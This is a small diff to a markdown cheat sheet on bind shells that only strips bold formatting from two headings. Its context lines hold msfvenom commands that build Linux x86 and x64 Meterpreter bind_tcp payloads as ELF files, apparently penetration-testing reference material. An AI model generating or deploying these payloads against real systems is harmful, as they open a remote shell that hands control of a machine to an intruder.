@@ -1,9 +1,9 @@
 # Bind Shells
 
-1. **x86 (32-bit) Payloads**
+1. x86 (32-bit) Payloads
 
 `$ msfvenom -p linux/x86/meterpreter/bind_tcp lport=<PORT> -f elf -o met-x86`
 
-2. **x86-64 (64-bit) Payloads**
+2. x86-64 (64-bit) Payloads
 
 `$ msfvenom -p linux/x64/meterpreter/bind_tcp lport=<PORT> -f elf -o met-x64`
